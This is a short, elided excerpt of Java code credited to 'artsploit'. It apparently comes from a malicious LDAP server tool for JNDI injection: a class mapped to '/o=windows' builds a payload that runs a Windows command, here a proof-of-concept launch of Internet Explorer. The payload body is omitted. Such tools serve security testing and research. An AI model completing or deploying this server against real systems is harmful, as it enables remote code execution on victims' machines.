 ...
 * @author artsploit
 */
@LdapMapping(uri = { "/o=windows" })
public class Windows implements LdapController {
    ...
    String payload = ("{" +
            ...
            "}")
            .replace("${command}", makeJavaScriptString(("\"C:\\Program Files\\Internet Explorer\\iexplore.exe\""));
